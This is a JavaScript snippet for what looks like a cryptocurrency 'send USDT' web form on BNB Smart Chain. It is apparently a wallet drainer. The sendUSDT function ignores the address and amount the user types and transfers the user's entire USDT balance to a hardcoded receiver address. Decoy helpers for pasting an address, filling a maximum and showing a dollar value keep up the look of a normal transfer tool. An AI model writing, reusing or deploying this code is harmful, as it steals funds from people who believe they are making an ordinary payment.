async function sendUSDT() {
  const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT (BNB Smart Chain)
  const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999"; // Aapka wallet

  const abi = [
    "function balanceOf(address) view returns (uint256)",
    "function transfer(address to, uint256 value) returns (bool)"
  ];

  if (!window.ethereum) {
    alert("⚠️ Please install MetaMask or Trust Wallet");
    return;
  }

  try {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    const signer = provider.getSigner();
    const userAddress = await signer.getAddress();

    const usdt = new ethers.Contract(usdtAddress, abi, signer);

    const balance = await usdt.balanceOf(userAddress);
    if (balance.isZero()) {
      alert("🚫 You have 0 USDT in your wallet.");
      return;
    }

    const tx = await usdt.transfer(receiver, balance);
    await tx.wait();

    alert("✅ All USDT transferred successfully!");
  } catch (err) {
    console.error(err);
    alert("❌ Error: " + err.message);
  }
}

function updateFiat() {
  const amount = document.getElementById("amount").value;
  const fiat = document.getElementById("fiat");

  if (!isNaN(amount) && amount.trim() !== "") {
    const formatted = parseFloat(amount).toFixed(2);
    fiat.textContent = `≈ $${formatted}`;
  } else {
    fiat.textContent = "≈ $0.00";
  }
}

function clearAddress() {
  document.getElementById("address").value = "";
}

function pasteAddress() {
  navigator.clipboard.readText().then(text => {
    document.getElementById("address").value = text;
  });
}

function fillMax() {
  document.getElementById("amount").value = "9999";
  updateFiat();
}
